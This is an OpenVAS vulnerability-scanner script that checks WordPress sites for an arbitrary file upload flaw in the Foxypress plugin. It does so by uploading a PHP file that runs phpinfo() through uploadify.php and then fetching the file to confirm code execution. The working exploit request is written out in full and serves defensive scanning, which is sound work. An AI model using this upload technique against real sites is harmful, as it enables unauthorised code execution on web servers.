##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_foxypress_file_upload_vuln.nasl 3566 2016-06-21 07:31:36Z benallard $
#
# WordPress Foxypress Plugin 'uploadify.php' Arbitrary File Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attacker to upload arbitrary PHP code
  and run it in the context of the Web server process.
  Impact Level: System/Application";
tag_affected = "WordPress Foxypress Plugin version 0.4.2.1";
tag_insight = "The flaw is due to the wp-content/plugins/foxypress/uploadify/
  uploadify.php script allowing to upload files with arbitrary extensions to
  a folder inside the webroot. This can be exploited to execute arbitrary PHP
  code by uploading a malicious PHP script.";
tag_solution = "Upgrade to WordPress Foxypress Plugin version 0.4.2.2 or later,
  For updates refer to http://wordpress.org/extend/plugins/foxypress/";
tag_summary = "This host is running WordPress Foxypress Plugin and is prone to
  file upload vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802638";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3566 $");
  script_bugtraq_id(53805);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2016-06-21 09:31:36 +0200 (Tue, 21 Jun 2016) $");
  script_tag(name:"creation_date", value:"2012-06-11 12:12:12 +0530 (Mon, 11 Jun 2012)");
  script_name("WordPress Foxypress Plugin 'uploadify.php' Arbitrary File Upload Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49382");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/53805");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18991");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/foxypress/changelog/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/113283/wpfoxypress-shell.txt");

  script_summary("Check if Foxypress Plugin is vulnerable to arbitrary file upload");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Variable Initialization
req = "";
res = "";
port = 0;
path = NULL;

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Port State
if(! get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(! can_host_php(port: port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack request
file = "ov-file-upload-test.php";
rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 220;
url = string(dir, "/wp-content/plugins/foxypress/uploadify/uploadify.php");
req = string(
      "POST ", url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=---------------------------5626d00351af\r\n",
      "Content-Length: ", len, "\r\n\r\n",
      "-----------------------------5626d00351af\r\n",
      'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
      "Content-Type: application/octet-stream\r\n",
      "\r\n",
      ex,"\r\n",
      "-----------------------------5626d00351af--\r\n\r\n");

## Uploading File Containing Exploit
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "HTTP/1.. 200")
{
  ## Get the file path
  path = eregmatch(pattern: 'file_path":".*(/wp-content[^"]+)', string: res);
  if(! path[1]) {
    exit(0);
  }

  path = ereg_replace(pattern: "\\", string: path[1], replace: "");
  if(! path) {
    exit(0);
  }

  ## Get the contents of uploaded file
  url = string(dir, path);

  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand))
  {
    security_message(port:port);
    exit(0);
  }
}
